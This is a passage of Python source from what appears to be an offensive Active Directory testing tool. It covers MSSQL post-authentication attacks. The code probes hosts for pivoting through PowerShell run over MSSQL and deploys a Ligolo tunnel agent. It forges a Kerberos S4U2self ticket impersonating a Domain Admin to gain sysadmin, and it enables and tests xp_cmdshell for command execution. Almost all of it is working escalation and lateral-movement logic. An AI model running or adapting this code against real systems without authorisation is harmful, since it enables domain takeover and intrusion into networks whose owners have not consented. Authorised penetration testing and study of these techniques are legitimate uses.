        inventory_payload = _collect_mssql_network_inventory(
            shell=shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            execution_path=execution_path,
        )
        if not isinstance(inventory_payload, dict):
            print_warning(
                "MSSQL network inventory returned an unexpected payload; skipping pivot reachability check."
            )
            return
        remote_interfaces = inventory_payload.get("interfaces", [])
        remote_routes = inventory_payload.get("routes", [])
        interface_source = (
            str(inventory_payload.get("interface_source") or "").strip() or "none"
        )
        route_source = (
            str(inventory_payload.get("route_source") or "").strip() or "none"
        )
        if not isinstance(remote_interfaces, list):
            remote_interfaces = []
        if not isinstance(remote_routes, list):
            remote_routes = []
        normalized_interfaces = [
            entry for entry in remote_interfaces if isinstance(entry, dict)
        ]
        normalized_routes = [
            entry for entry in remote_routes if isinstance(entry, dict)
        ]
        print_info_debug(
            "MSSQL pivot inventory summary: "
            f"interface_source={mark_sensitive(interface_source, 'text')} "
            f"interfaces={len(normalized_interfaces)} "
            f"preview={mark_sensitive(_summarize_mssql_pivot_inventory(normalized_interfaces), 'text')} "
            f"route_source={mark_sensitive(route_source, 'text')} "
            f"routes={len(normalized_routes)} "
            f"route_preview={mark_sensitive(_summarize_mssql_pivot_inventory(normalized_routes, route_mode=True), 'text')}"
        )

        selected_targets = _select_mssql_pivot_targets(
            candidate_entries=candidate_entries,
            remote_interfaces=normalized_interfaces,
            remote_routes=normalized_routes,
        )
        if not selected_targets:
            hidden_targets = [
                str(entry.get("ip") or "").strip()
                for entry in candidate_entries
                if isinstance(entry, dict) and str(entry.get("ip") or "").strip()
            ]
            report_path = _persist_mssql_pivot_reachability_report(
                shell,
                domain=domain,
                host=host,
                payload={
                    "generated_at": datetime.now(timezone.utc).isoformat(),
                    "domain": domain,
                    "pivot_host": host,
                    "pivot_username": username,
                    "interfaces": normalized_interfaces,
                    "routes": normalized_routes,
                    "interface_source": interface_source,
                    "route_source": route_source,
                    "summary": {
                        "hidden_target_count": candidate_counts["host_hidden_count"],
                        "service_hidden_target_count": candidate_counts[
                            "service_hidden_count"
                        ],
                        "trusted_domain_target_count": candidate_counts[
                            "trusted_domain_count"
                        ],
                        "candidate_count": 0,
                        "confirmed_reachable_count": 0,
                        "same_subnet_no_response_count": 0,
                        "no_connectivity_confirmed_count": 0,
                    },
                    "skip_reason": "no_matching_subnet_or_route",
                    "hidden_targets": hidden_targets,
                    "candidate_origins": candidate_counts,
                    "targets": [],
                },
            )
            if report_path:
                print_info_debug(
                    "MSSQL pivot skip diagnostics saved to "
                    f"{mark_sensitive(report_path, 'path')}."
                )
            return

        subnet_candidates = sum(
            1
            for target in selected_targets
            if str(target.selection_reason).startswith("same_subnet:")
        )
        routed_candidates = len(selected_targets) - subnet_candidates
        trusted_domain_candidates = sum(
            1
            for target in selected_targets
            if target.origin == "trusted_domain_connectivity"
        )
        print_info(
            f"This host may be a useful pivot for {len(selected_targets)} target(s) "
            f"({candidate_counts['host_hidden_count']} hidden current-vantage, "
            f"{candidate_counts['service_hidden_count']} service-hidden, "
            f"{candidate_counts['trusted_domain_count']} trusted-domain, "
            f"{subnet_candidates} same-subnet, {routed_candidates} routed)."
        )
        print_info_debug(
            "MSSQL pivot candidate selection: "
            f"selected={len(selected_targets)} "
            f"trusted_domain={trusted_domain_candidates} "
            f"preview={mark_sensitive(', '.join(f'{target.ip}:{target.origin}:{target.selection_reason}' for target in selected_targets), 'text')}"
        )

        default_confirm = str(getattr(shell, "type", "") or "").strip().lower() == "ctf"
        if not Confirm.ask(
            (
                f"Do you want to probe {len(selected_targets)} likely pivot target(s) from "
                f"{mark_sensitive(host, 'hostname')} via MSSQL?"
            ),
            default=default_confirm,
        ):
            print_info("Skipping MSSQL pivot reachability probing by user choice.")
            return

        probe_stdout = _execute_powershell_via_mssql(
            shell=shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            execution_path=execution_path,
            script=_build_mssql_pivot_probe_script(selected_targets),
            operation_name="pivot_tcp_probe",
        )
        probe_payload = _load_mssql_json_stdout(probe_stdout)
        targets_payload = (
            probe_payload.get("targets", []) if isinstance(probe_payload, dict) else []
        )
        if not isinstance(targets_payload, list):
            print_warning(
                "MSSQL pivot probe returned an unexpected payload; skipping report rendering."
            )
            return

        confirmed_reachable: list[dict[str, Any]] = []
        same_subnet_no_response: list[dict[str, Any]] = []
        no_connectivity_confirmed: list[dict[str, Any]] = []
        for entry in targets_payload:
            if not isinstance(entry, dict):
                continue
            reachable_ports = [
                int(port)
                for port in entry.get("reachable_ports", [])
                if str(port).isdigit()
            ]
            reason = str(entry.get("selection_reason") or "").strip()
            if reachable_ports:
                confirmed_reachable.append(entry)
            elif reason.startswith("same_subnet:"):
                same_subnet_no_response.append(entry)
            else:
                no_connectivity_confirmed.append(entry)

        summary_payload: dict[str, Any] = {
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "domain": domain,
            "pivot_host": host,
            "pivot_username": username,
            "interfaces": remote_interfaces,
            "routes": remote_routes,
            "interface_source": interface_source,
            "route_source": route_source,
            "summary": {
                "candidate_count": len(selected_targets),
                "confirmed_reachable_count": len(confirmed_reachable),
                "service_hidden_target_count": candidate_counts["service_hidden_count"],
                "trusted_domain_target_count": candidate_counts["trusted_domain_count"],
                "same_subnet_no_response_count": len(same_subnet_no_response),
                "no_connectivity_confirmed_count": len(no_connectivity_confirmed),
            },
            "candidate_origins": candidate_counts,
            "targets": targets_payload,
        }
        report_path = _persist_mssql_pivot_reachability_report(
            shell,
            domain=domain,
            host=host,
            payload=summary_payload,
        )

        if confirmed_reachable:
            print_success(
                f"{len(confirmed_reachable)} pivot target(s) appear reachable from {mark_sensitive(host, 'hostname')}."
            )
            if getattr(shell, "console", None):
                table = Table(title="Confirmed Pivot Reachability", box=None)
                table.add_column("IP")
                table.add_column("Hostname(s)")
                table.add_column("Reachable Ports")
                table.add_column("Reason")
                for entry in confirmed_reachable[:10]:
                    table.add_row(
                        mark_sensitive(str(entry.get("ip") or ""), "ip"),
                        ", ".join(
                            mark_sensitive(str(item), "hostname")
                            for item in entry.get("hostname_candidates", [])
                        )
                        or "-",
                        ", ".join(
                            str(port) for port in entry.get("reachable_ports", [])
                        )
                        or "-",
                        mark_sensitive(
                            str(entry.get("selection_reason") or ""), "text"
                        ),
                    )
                shell.console.print(table)
        if same_subnet_no_response:
            print_info(
                f"{len(same_subnet_no_response)} target(s) are on-link from the pivot host but still gave no TCP response; they may simply be down/offline."
            )
        if no_connectivity_confirmed:
            print_warning(
                f"{len(no_connectivity_confirmed)} routed target(s) still showed no confirmed TCP reachability from the pivot host."
            )
        if report_path:
            print_info(
                f"Detailed MSSQL pivot reachability report saved to {mark_sensitive(report_path, 'path')}."
            )

        if confirmed_reachable:
            tunnel_created = orchestrate_ligolo_pivot_tunnel(
                shell,
                domain=domain,
                pivot_host=host,
                username=username,
                password=password,
                confirmed_targets=confirmed_reachable,
                detect_remote_architecture=lambda **_kwargs: (
                    detect_mssql_windows_architecture(
                        shell=shell,
                        domain=domain,
                        host=host,
                        username=username,
                        password=password,
                        execution_path=execution_path,
                    )
                ),
                upload_agent=lambda **kwargs: mssql_upload(
                    shell=shell,
                    domain=kwargs["domain"],
                    host=kwargs["host"],
                    username=kwargs["username"],
                    password=kwargs["password"],
                    execution_path=execution_path,
                    local_path=kwargs["local_path"],
                    remote_path=kwargs["remote_path"],
                ),
                execute_remote_script=lambda **kwargs: _execute_powershell_via_mssql(
                    shell=shell,
                    domain=kwargs["domain"],
                    host=kwargs["host"],
                    username=kwargs["username"],
                    password=kwargs["password"],
                    execution_path=execution_path,
                    script=kwargs["script"],
                    operation_name=kwargs.get("operation_name"),
                ),
                remote_agent_os="windows",
                source_service="mssql",
                pivot_method="ligolo_mssql_pivot",
            )
            if tunnel_created:
                pivot_context = PivotExecutionContext(
                    domain=domain,
                    pivot_host=host,
                    pivot_method="ligolo_mssql_pivot",
                    pivot_tool="Ligolo",
                    source_service="mssql",
                )
                maybe_offer_post_pivot_trust_followup_from_targets(
                    shell,
                    context=pivot_context,
                    confirmed_targets=confirmed_reachable,
                )
                refresh_result = refresh_network_inventory_after_pivot(
                    shell,
                    context=pivot_context,
                )
                if refresh_result.refreshed:
                    render_post_pivot_reachability_delta(
                        shell,
                        context=pivot_context,
                        refresh_result=refresh_result,
                    )
                    if offer_post_pivot_owned_followup:
                        maybe_offer_post_pivot_owned_followup(
                            shell,
                            context=pivot_context,
                            refresh_result=refresh_result,
                        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning(
            f"MSSQL pivot reachability check failed on {mark_sensitive(host, 'hostname')}: {str(exc)}"
        )


def _load_mssql_host_alias_inventory(
    shell: MssqlShell, domain: str
) -> dict[str, list[str]]:
    """Return the workspace IP <-> hostname map for one domain (best-effort).

    Reuses :func:`load_workspace_ip_hostname_inventory` (massdns +
    network-reachability reports) so the SPN-ownership gate bridges an
    IP-form MSSQL target to its resolved FQDN exactly as the rest of the
    runtime does. Never raises — an unreadable/absent workspace yields ``{}``.
    """
    from adscan_internal.services.kerberos_hostname_inventory import (  # noqa: PLC0415
        load_workspace_ip_hostname_inventory,
    )

    try:
        workspace_dir = _get_workspace_dir(shell)
        domains_dir = str(getattr(shell, "domains_dir", "") or "")
        if not workspace_dir or not domains_dir:
            return {}
        return load_workspace_ip_hostname_inventory(
            workspace_dir=workspace_dir,
            domains_dir=domains_dir,
            domain=domain,
        )
    except Exception as exc:  # noqa: BLE001 - degrade to no-inventory
        telemetry.capture_exception(exc)
        return {}


def _service_account_owns_mssql_spn(
    shell: MssqlShell, *, domain: str, host: str, service_account: str
) -> bool:
    """Return True when ``service_account`` owns an ``MSSQLSvc/<host>`` SPN.

    Cheap precondition read from the workspace collector graph (no new LDAP):
    the principal we authenticated to MSSQL as must be the account running the
    SQL Server service for the S4U2self + altservice trick to work. We match the
    SPN's host portion against the target host (FQDN, short name, or NetBIOS),
    not the port, so ``MSSQLSvc/breachdc.breach.vl:1433`` and
    ``MSSQLSvc/breachdc.breach.vl`` both qualify.

    The host match is **alias-aware**: when the MSSQL connection target is an
    IP (the common case for HTB/VPN runs) and the owned SPN is FQDN-based, the
    raw token compare can never match (``10.129.13.221`` vs
    ``breachdc.breach.vl``). We therefore expand BOTH the target host and each
    SPN host into their alias key sets via the canonical
    :func:`expand_host_aliases` (IP <-> short <-> FQDN <-> ``HOST$``), bridged
    through the workspace's resolved IP <-> hostname inventory, and compare the
    sets. This mirrors the IP->FQDN resolution the downstream mint step already
    performs, so the gate never rejects a path the mint step could satisfy.

    Emits a structured ``--debug`` skip reason distinguishing the three
    negative realities (account not in collector data / owns zero MSSQLSvc SPNs
    / owns MSSQLSvc SPN(s) but none matched the target host after alias
    resolution) so a false-skip is diagnosable from the recording alone.
    """
    from adscan_internal.services.domain_controller_classifier import (  # noqa: PLC0415
        expand_host_aliases,
    )

    marked_user = mark_sensitive(service_account, "user")
    marked_host = mark_sensitive(host, "hostname")
    try:
        service = None
        if hasattr(shell, "_get_graph_service"):
            service = shell._get_graph_service()  # type: ignore[attr-defined]
        if service is None or not hasattr(service, "get_user_node_by_samaccountname"):
            print_info_debug(
                f"mssql s4u2self gate: graph service unavailable; cannot verify "
                f"MSSQLSvc SPN ownership for {marked_user} on {marked_host}."
            )
            return False
        node = service.get_user_node_by_samaccountname(domain, service_account)
        if not isinstance(node, dict):
            print_info_debug(
                f"mssql s4u2self gate: account {marked_user} not found in collector "
                f"data for domain {mark_sensitive(domain, 'domain')} — cannot verify "
                f"MSSQLSvc SPN ownership on {marked_host}."
            )
            return False
        # ``get_user_node_by_samaccountname`` (local_graph_service._find_node)
        # returns the FLATTENED properties dict directly, so ``serviceprincipalnames``
        # is a top-level key — NOT nested under ``properties``. Handle both shapes
        # defensively so a future node-with-nested-properties return still resolves.
        props = node.get("properties") if isinstance(node.get("properties"), dict) else node
        spns = props.get("serviceprincipalnames") or []
    except Exception as exc:
        telemetry.capture_exception(exc)
        return False

    # Collect the MSSQLSvc SPNs the account actually owns (host portion, no port).
    mssql_spn_hosts: list[str] = []
    for spn in spns:
        spn_str = str(spn or "").strip()
        if not spn_str.lower().startswith("mssqlsvc/"):
            continue
        spn_host = spn_str.split("/", 1)[1].split(":", 1)[0].strip()
        if spn_host:
            mssql_spn_hosts.append(spn_host)

    if not mssql_spn_hosts:
        print_info_debug(
            f"mssql s4u2self gate: account {marked_user} found in collector data but "
            f"owns zero MSSQLSvc SPNs — skipping S4U2self offer on {marked_host}."
        )
        return False

    host_token = str(host or "").strip()
    if not host_token:
        return False

    # Alias-aware comparison: expand the target host and each SPN host into the
    # canonical key sets, bridged via the workspace IP <-> hostname inventory so
    # an IP-form MSSQL target matches an FQDN-form SPN (and vice versa).
    inventory = _load_mssql_host_alias_inventory(shell, domain)
    target_keys = expand_host_aliases(host_token, ip_hostname_inventory=inventory)
    for spn_host in mssql_spn_hosts:
        spn_keys = expand_host_aliases(spn_host, ip_hostname_inventory=inventory)
        if target_keys & spn_keys:
            return True

    alias_attempted = bool(inventory)
    # Bracket-free SPN list: Rich would parse a leading "[" as console markup
    # and silently drop the line (CLAUDE.md: square-brackets-eat-markup rule).
    owned_spn_display = mark_sensitive(
        ", ".join(f"MSSQLSvc/{h}" for h in mssql_spn_hosts), "text"
    )
    print_info_debug(
        f"mssql s4u2self gate: account {marked_user} owns MSSQLSvc SPNs "
        f"{owned_spn_display} but none matched target host {marked_host} "
        f"(alias resolution {'attempted' if alias_attempted else 'unavailable'}) "
        f"— skipping S4U2self offer."
    )
    return False


def _select_domain_admin_for_s4u2self(
    shell: MssqlShell, *, domain: str
) -> str | None:
    """Offer the operator a Domain Admin to impersonate; Administrator first.

    ``Administrator`` is offered as the default because the built-in account is
    the one most likely mapped to MSSQL ``sysadmin`` via
    ``BUILTIN\\Administrators``. Non-interactive runs auto-resolve to the
    default index via the centralized prompt helper (never blocks CI).
    """
    from adscan_core.output import questionary_select_index  # noqa: PLC0415
    from adscan_internal.cli.ldap import get_domain_admins  # noqa: PLC0415

    admins = [a for a in (get_domain_admins(shell, domain) or []) if str(a).strip()]
    if not admins:
        return None

    # Order so the built-in Administrator (if present) is the default pick.
    ordered: list[str] = sorted(
        set(admins),
        key=lambda a: (0 if a.strip().lower() == "administrator" else 1, a.lower()),
    )
    if len(ordered) == 1:
        return ordered[0]

    idx = questionary_select_index(
        title=(
            f"Select a Domain Admin to impersonate via S4U2self "
            f"on {mark_sensitive(domain, 'domain')}:"
        ),
        options=ordered,
        default_idx=0,
        shell=shell,
    )
    if idx is None:
        return None
    return ordered[idx]


def _render_s4u2self_offer_panel(
    *, domain: str, host: str, service_account: str
) -> None:
    """Premium panel explaining the S4U2self → Domain Admin escalation offer."""
    from rich.console import Group  # noqa: PLC0415
    from rich.table import Table  # noqa: PLC0415
    from rich.text import Text  # noqa: PLC0415

    headline = Text(
        "This principal runs the MSSQL service — it can mint its own admin ticket.",
        style="bold",
    )
    body = Table.grid(padding=(0, 2))
    body.add_column(style="dim")
    body.add_column()
    body.add_row("Service account", mark_sensitive(service_account, "user"))
    body.add_row("Service SPN", f"MSSQLSvc/{mark_sensitive(host, 'hostname')}:1433")
    body.add_row(
        "Technique",
        "Kerberos S4U2self + altservice (no delegation rights required)",
    )
    explanation = Text(
        "Because we control the service account's credentials, ADscan can request "
        "a Kerberos service ticket to its own MSSQLSvc SPN while impersonating a "
        "Domain Admin, then log back into MSSQL as that admin for instant "
        "sysadmin — skipping the dead-end low-privilege enumeration.",
        style="dim",
    )
    print_panel(
        Group(headline, Text(""), body, Text(""), explanation),
        title="🎫 MSSQL → Domain Admin via S4U2self",
        border_style="cyan",
    )


def _try_mssql_s4u2self_as_da(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    service_account_username: str,
    service_account_secret: str,
    backend: ImpacketMSSQLBackend,
    kdc_host: str | None,
    escalation_chain: set[tuple[str, str]] | None,
) -> MssqlExecutionPath | None:
    """Attempt S4U2self escalation to Domain Admin sysadmin on this MSSQL host.

    Thin Layer-2 consumer of the generic ``mint_s4u2self_ticket`` primitive.
    Returns an :class:`MssqlExecutionPath` only when a Domain Admin login was
    confirmed as sysadmin (and the recursive re-entry established execution).
    Returns ``None`` (skip, current flow unchanged) when the precondition fails,
    the operator declines, the mint fails, or the impersonated DA does not map
    to sysadmin on this box.
    """
    from adscan_core.interaction import is_non_interactive  # noqa: PLC0415
    from adscan_core.output import confirm_ask  # noqa: PLC0415
    from adscan_internal.models.domain import resolve_dc_fqdn, resolve_dc_ip  # noqa: PLC0415
    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415
    from adscan_internal.services.attack_graph_service import (  # noqa: PLC0415
        upsert_netexec_privilege_edge,
    )
    from adscan_internal.services.domain_posture import get_posture  # noqa: PLC0415
    from adscan_internal.services.exploitation.s4u2self_service import (  # noqa: PLC0415
        S4U2SelfRequest,
        mint_s4u2self_ticket,
        render_s4u2self_result,
    )

    marked_host = mark_sensitive(host, "hostname")

    # --- Precondition 1: usable credential material (no ccache-only here) ---
    secret = str(service_account_secret or "").strip()
    if not secret or secret.lower().endswith(".ccache"):
        print_info_debug(
            "[mssql][s4u2self] No raw secret for the service account "
            "(ccache-only login) — cannot mint S4U2self. Skipping."
        )
        return None

    # --- Precondition 2: the principal owns the MSSQLSvc SPN on this host ---
    # The precise skip reason (account not found / zero MSSQLSvc SPNs / owned
    # but host mismatch after alias resolution) is logged inside the gate.
    if not _service_account_owns_mssql_spn(
        shell, domain=domain, host=host, service_account=service_account_username
    ):
        return None

    # --- DC/KDC resolution (FQDN SPN enforced inside the primitive) ---
    domains_data = getattr(shell, "domains_data", None)
    domain_record = domains_data.get(domain) or {} if isinstance(domains_data, dict) else {}
    dc_ip = kdc_host or resolve_dc_ip(domain_record)
    if not dc_ip:
        print_info_debug(
            "[mssql][s4u2self] No DC/KDC IP resolved for the domain — skipping."
        )
        return None
    kdc_fqdn = resolve_dc_fqdn(domain_record, target_domain=domain)

    # --- Premium offer + gating (ctf: default Yes, audit: prompt, CI: safe default) ---
    _render_s4u2self_offer_panel(
        domain=domain, host=host, service_account=service_account_username
    )
    is_ctf = str(getattr(shell, "type", "") or "").strip().lower() == "ctf"
    default_yes = is_ctf
    if is_non_interactive(shell):
        proceed = default_yes
        print_info_debug(
            f"[mssql][s4u2self] Non-interactive; auto-resolving offer to "
            f"{'Yes' if proceed else 'No'} (ctf={is_ctf})."
        )
    else:
        proceed = confirm_ask(
            "Mint a Kerberos ticket impersonating a Domain Admin and log into "
            f"MSSQL on {marked_host} as that admin?",
            default=default_yes,
        )
    if not proceed:
        print_info("Skipping S4U2self escalation; continuing with the normal flow.")
        return None

    # --- Domain Admin selection (Administrator offered first) ---
    da_user = _select_domain_admin_for_s4u2self(shell, domain=domain)
    if not da_user:
        print_warning(
            "No Domain Admin available to impersonate; continuing with the normal flow."
        )
        return None

    # --- Recursion guard ---
    chain = set(escalation_chain or set())
    chain_key = (str(host).strip().lower(), str(da_user).strip().lower())
    if chain_key in chain:
        print_info_debug(
            "[mssql][s4u2self] Escalation already attempted for "
            f"{mark_sensitive(da_user, 'user')} on {marked_host}; not recursing."
        )
        return None
    chain.add(chain_key)

    # --- Resolve the SPN host EXACTLY as the (re-entry) MSSQL backend will ---
    # Impacket searches the ccache for ``MSSQLSvc/<remoteName>:<port>`` where
    # ``remoteName`` is ``normalize_kerberos_target_hostname(host, domain)``
    # (see ImpacketMSSQLBackend.__init__). The minted ST sname MUST match that
    # string verbatim or impacket falls through to a fresh TGS-REQ that the KDC
    # rejects with KDC_ERR_S_PRINCIPAL_UNKNOWN. We therefore reuse the backend's
    # own ``_kerberos_remote_name`` as the SPN host.
    from adscan_internal.services._kerberos_spn import (  # noqa: PLC0415
        is_ip_address,
    )

    spn_host = getattr(backend, "_kerberos_remote_name", None) or host
    if is_ip_address(spn_host):
        # No FQDN recoverable for the MSSQL host — a Kerberos SPN cannot bind to
        # an IP (the ticket would be rejected with no visible Kerberos error).
        resolved_fqdn = resolve_dc_fqdn(domain_record, target_domain=domain)
        if resolved_fqdn and not is_ip_address(resolved_fqdn):
            spn_host = resolved_fqdn
        else:
            print_warning(
                "Cannot build an FQDN MSSQLSvc SPN for this host (only an IP is "
                "known) — skipping S4U2self escalation."
            )
            return None

    target_spn = f"MSSQLSvc/{spn_host}:1433"
    posture_snapshot = None
    try:
        if isinstance(domains_data, dict):
            posture_snapshot = get_posture(domains_data, domain=domain)
    except Exception as posture_exc:
        telemetry.capture_exception(posture_exc)

    workspace_dir = _get_workspace_dir(shell)
    tickets_dir = os.path.join(workspace_dir, shell.domains_dir, domain, "tickets")
    os.makedirs(tickets_dir, exist_ok=True)
    ccache_out = os.path.join(
        tickets_dir, f"s4u2self_{da_user}_{host}.ccache".replace("/", "_")
    )

    print_info(
        f"Minting Kerberos ST: impersonate {mark_sensitive(da_user, 'user')} "
        f"→ {mark_sensitive(target_spn, 'hostname')}"
    )
    mint_result = run_async_sync(
        mint_s4u2self_ticket(
            S4U2SelfRequest(
                domain=domain,
                service_account=service_account_username,
                impersonate_user=da_user,
                target_spn=target_spn,
                dc_ip=dc_ip,
                kdc_fqdn=kdc_fqdn,
                password=None if is_hash_authentication(secret) else secret,
                nt_hash=secret if is_hash_authentication(secret) else None,
                posture_snapshot=posture_snapshot,
                ccache_output_path=ccache_out,
            )
        )
    )
    render_s4u2self_result(mint_result)
    if not mint_result.success or not mint_result.ccache_path:
        print_warning(
            "S4U2self ticket mint did not succeed; continuing with the normal flow."
        )
        return None

    # --- Re-login as the DA via the minted ccache + recursive re-entry ---
    print_info(
        f"Logging into MSSQL on {marked_host} as "
        f"{mark_sensitive(da_user, 'user')} via the minted ticket."
    )
    # The re-entry backend derives remoteName from this ``host`` via the same
    # normalize helper. When the original host was an IP we resolved an FQDN for
    # the SPN above; pass that FQDN as the re-entry host so its ccache lookup
    # (``MSSQLSvc/<remoteName>:1433``) matches the minted ST exactly.
    reentry_host = host if not is_ip_address(host) else spn_host
    reentry = run_mssql_postauth_workflow(
        shell,
        domain=domain,
        host=reentry_host,
        username=da_user,
        password=mint_result.ccache_path,  # .ccache secret → Kerberos login
        escalation_chain=chain,
    )

    if isinstance(reentry, dict) and reentry.get("execution_available"):
        # Confirmed DA → sysadmin → execution path established.
        try:
            # Source = the service account WE control (e.g. svc_mssql), NOT the
            # impersonated DA — the edge must extend the owned→Tier0 kill chain
            # (low-priv → DC = CRITICAL). Recording da_user as source would emit
            # ``Administrator → DC`` which is structural noise (Domain Breaker →
            # anything = INFO) and disconnected from the owned set. The
            # impersonated DA is captured as edge metadata instead.
            upsert_netexec_privilege_edge(
                shell,
                domain,
                username=service_account_username,
                relation="MssqlS4U2selfEscalation",
                target_ip=dc_ip,
                target_hostname=kdc_fqdn or host,
                notes_extra={
                    "impersonated_user": da_user,
                    "technique": "S4U2self+altservice",
                },
            )
        except Exception as edge_exc:
            telemetry.capture_exception(edge_exc)
        print_success(
            f"S4U2self escalation succeeded: {mark_sensitive(da_user, 'user')} "
            f"is sysadmin on {marked_host}."
        )
        # The re-entry already ran the full xp_cmdshell → exec chain; signal the
        # caller to stop the low-priv flow here.
        return MssqlExecutionPath(
            mode=str(reentry.get("execution_mode") or "xp_cmdshell"),
            linked_server=reentry.get("linked_server"),  # type: ignore[arg-type]
            identity=da_user,
        )

    print_warning(
        f"Impersonated Domain Admin {mark_sensitive(da_user, 'user')} did not map "
        f"to sysadmin on {marked_host}. Falling back to the normal flow. "
        "(Trying additional Domain Admins is a possible follow-up.)"
    )
    return None


def _verify_xp_cmdshell_executable(
    backend: ImpacketMSSQLBackend,
    *,
    domain: str,
    username: str,
    secret: str,
) -> bool:
    """Return True when the current login can actually invoke ``xp_cmdshell`` now.

    ``xp_cmdshell`` reading as ENABLED does NOT imply the current principal can
    use it: a non-sysadmin login needs an explicit ``EXECUTE`` grant on the
    object AND a configured proxy account. When either is missing, the option
    still reports enabled yet every invocation returns ``The EXECUTE permission
    was denied on the object 'xp_cmdshell'`` (or a proxy-account error). A
    permission lookup like ``HAS_PERMS_BY_NAME`` can return 1 yet still fail at
    invocation time (missing proxy account), so the only reliable signal is a
    single minimal invocation through the existing backend, classified by
    success/failure. The probe issues a benign ``echo`` one-liner — the same
    kind of benign command the backend already uses for its validation checks.

    Args:
        backend: Authenticated MSSQL backend bound to the target host.
        domain: Authentication domain for the current credential.
        username: sAMAccountName / login used for the connection.
        secret: Password, NT hash, or ``.ccache`` path (Kerberos).

    Returns:
        True if the benign invocation succeeded (xp_cmdshell is usable by the
        current principal); False on EXECUTE-permission-denied, proxy-account
        error, or any other failure (caller falls through to remaining checks).
    """
    try:
        probe = backend.execute_command(
            domain=domain,
            username=username,
            secret=secret,
            command="echo adscan_xp_probe",
            timeout=60,
        )
    except Exception as exc:  # noqa: BLE001 - any failure means "not usable now"
        telemetry.capture_exception(exc)
        return False
    return bool(getattr(probe, "success", False))


def run_mssql_postauth_workflow(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    workflow_intent: str = "default",
    escalation_chain: set[tuple[str, str]] | None = None,
) -> dict[str, object]:
    """Run the premium MSSQL post-auth workflow for low-priv and linked-server paths.

    This is the native-stack implementation: a single privilege sweep
    against impacket TDS replaces the old four-call NetExec subprocess
    chain (verify_authentication → enable_xp_cmdshell → enum_linked_servers
    → enable_linked_xp_cmdshell). The premium sweep card is emitted up
    front so the operator sees the full fingerprint before any
    follow-ups run.
    """
    marked_host = mark_sensitive(host, "hostname")
    marked_user = mark_sensitive(username, "user")
    print_operation_header(
        "MSSQL Post-Auth Workflow",
        details={
            "Domain": domain,
            "Host": host,
            "Username": username,
        },
        icon="🗄️",
    )

    from adscan_internal.models.domain import resolve_dc_ip

    _kdc_host = resolve_dc_ip(
        (getattr(shell, "domains_data", None) or {}).get(domain) or {}
    )
    backend = ImpacketMSSQLBackend(host=host, domain=domain, kdc_host=_kdc_host)
    sweep = backend.sweep_privileges(
        domain=domain,
        username=username,
        secret=password,
        timeout=90,
    )
    if sweep is None:
        print_error(
            f"Could not authenticate to MSSQL as {marked_user} on {marked_host}."
        )
        return {
            "completed": False,
            "error": "auth_not_confirmed",
        }

    print_success(
        f"[bold]Login confirmed[/bold]  {marked_user} @ {marked_host}"
    )
    print_mssql_sweep_card(sweep)

    execution_path: MssqlExecutionPath | None = None

    # Not sysadmin → escalation to a Domain Admin is the highest-value path; try
    # it FIRST, regardless of whether xp_cmdshell happens to be enabled. A
    # non-sysadmin cannot EXECUTE xp_cmdshell anyway, so the ENABLED branch below
    # is a dead end for non-sysadmins. ``_try_mssql_s4u2self_as_da`` returns None
    # (current flow unchanged, byte-identical to before) when its preconditions
    # fail, the operator declines, or the impersonated DA is not sysadmin —
    # so non-applicable cases fall straight through to the existing tree.
    if not sweep.is_sysadmin:
        s4u_path = _try_mssql_s4u2self_as_da(
            shell,
            domain=domain,
            host=host,
            service_account_username=username,
            service_account_secret=password,
            backend=backend,
            kdc_host=_kdc_host,
            escalation_chain=escalation_chain,
        )
        if s4u_path is not None:
            # The recursive re-entry as the Domain Admin already ran the full
            # xp_cmdshell → exec chain; do not run the low-priv follow-ups again.
            return {
                "completed": True,
                "execution_available": True,
                "execution_mode": s4u_path.mode,
                "linked_server": s4u_path.linked_server,
                "escalation": "s4u2self_da",
            }

    # The option reading as ENABLED does NOT imply the current principal can use
    # it, and DISABLED does NOT imply we cannot enable it. The reliable signals
    # are ground truth, not role inference:
    #   1. Enabling xp_cmdshell requires the ALTER SETTINGS server permission,
    #      held by sysadmin AND by serveradmin AND by any login explicitly
    #      granted it. So we ATTEMPT the enable regardless of role when the
    #      option is off — it is harmless (just fails) when we lack permission,
    #      and unlocks the path for serveradmin / ALTER-SETTINGS logins that the
    #      old is_sysadmin-only gate dead-ended.
    #   2. Real usability is then confirmed by actually invoking a benign
    #      command (sysadmin is always usable when enabled; otherwise probe),
    #      because an enabled option still fails for a non-sysadmin without an
    #      EXECUTE grant AND a configured proxy account.
    # If we enabled it ourselves but it turns out NOT usable, we revert our
    # config change (hygiene — do not leave xp_cmdshell on if it bought us
    # nothing) and fall through to the remaining diagnostic checks.
    xp_enabled = sweep.xp_cmdshell == XpCmdshellStatus.ENABLED
    enabled_by_us = False
    original_advanced_on = False

    if not xp_enabled:
        # Capture the pre-enable advanced-options state so a later revert can
        # restore it exactly (a box that already had advanced options on must be
        # left that way). Best-effort: an unreadable state defaults to off.
        try:
            _, original_advanced_on = backend._read_xp_cmdshell_state(
                domain=domain,
                username=username,
                secret=password,
                timeout=30,
            )
        except Exception as exc:  # noqa: BLE001 - state read is best-effort
            telemetry.capture_exception(exc)
            original_advanced_on = False

        print_info_debug(
            f"xp_cmdshell is disabled on {marked_host}; attempting to enable it "
            f"as {marked_user} (succeeds for sysadmin / serveradmin / ALTER SETTINGS)."
        )
        enable_result = backend.enable_xp_cmdshell(
            domain=domain,
            username=username,
            secret=password,
            timeout=60,
        )
        if enable_result.success:
            xp_enabled = True
            enabled_by_us = True
            print_info_debug(
                f"xp_cmdshell enable attempt succeeded on {marked_host}."
            )
            print_warning(
                f"[bold]xp_cmdshell enabled[/bold] on {marked_host} "
                "(SQL Server configuration modified - revert after engagement)."
            )
        else:
            # Lacking ALTER SETTINGS is the common, expected outcome for a
            # low-priv login — log at debug, do not treat as fatal.
            reason = parse_xp_cmdshell_enable_failure_reason(
                enable_result.stderr or enable_result.stdout or ""
            )
            if reason:
                print_info_debug(
                    "xp_cmdshell enable attempt failed on "
                    f"{marked_host}: {mark_sensitive(reason, 'detail')}."
                )
            else:
                print_info_debug(
                    f"xp_cmdshell enable attempt was not confirmed on {marked_host}."
                )

    def _revert_xp_cmdshell_if_we_enabled() -> None:
